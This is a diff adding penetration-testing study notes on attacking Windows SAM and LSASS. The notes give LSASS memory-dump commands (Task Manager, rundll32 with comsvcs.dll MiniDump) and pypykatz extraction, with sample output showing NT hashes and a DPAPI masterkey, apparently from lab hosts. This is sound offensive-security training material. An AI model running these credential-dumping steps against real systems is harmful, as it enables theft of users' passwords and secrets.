@@ -1,3 +1,15 @@
+- [Attacking SAM](#attacking-sam)
+- [Attacking LSASS](#attacking-lasass)
+
+
+
+
+
+![Screenshot_8](https://github.com/kiro6/penetration-testing-notes/assets/57776872/23757489-37b1-41f2-82f3-70be69c26b8f)
+
+
+
+
 
 ## Attacking SAM
 
@@ -98,3 +110,83 @@ SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b
 SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
 SMB         10.129.42.198   445    WS01     [+] Added 8 SAM hashes to the database
 ```
+
+## Attacking LSASS
+
+### Dumping LSASS Process Memory
+
+#### Task Manager Method
+```
+Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
+
+A file called lsass.DMP is created and saved in:  C:\Users\loggedonusersdirectory\AppData\Local\Temp
+```
+#### Rundll32.exe & Comsvcs.dll Method
+
+```powershell
+
+Get-Process lsass
+
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full 
+```
+```cmd
+
+tasklist /svc | findstr lsass
+
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
+```
+
+### Using Pypykatz to Extract Credentials
+[pypykatz](https://github.com/skelsec/pypykatz)
+
+```bash
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+```
+#### MSV
+MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
+```
+sid S-1-5-21-4019466498-1700476312-3544718034-1001
+luid 1354633
+	== MSV ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+		LM: NA
+		NT: 64f12cddaa88057e06a81b54e73b949b
+		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
+		DPAPI: NA
+```
+
+#### WDIGEST
+WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text
+```
+	== WDIGEST [14ab89]==
+		username bob
+		domainname DESKTOP-33E7O54
+		password None
+		password (hex)
+```
+
+#### Kerberos
+```
+== Kerberos ==
+		Username: bob
+		Domain: DESKTOP-33E7O54
+```
+
+#### DPAPI
+Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI
+```
+	== DPAPI [14ab89]==
+		luid 1354633
+		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
+		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
+		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
+```
+
+| Application              | Use of DPAPI                                            |
+|--------------------------|---------------------------------------------------------|
+| Internet Explorer        | Password form auto-completion data (username and password for saved sites).  |
+| Google Chrome            | Password form auto-completion data (username and password for saved sites).  |
+| Outlook                  | Passwords for email accounts.                            |
+| Remote Desktop Connection| Saved credentials for connections to remote machines.    |
+| Credential Manager       | Saved credentials for accessing shared resources, joining wireless networks, VPNs, and more. |
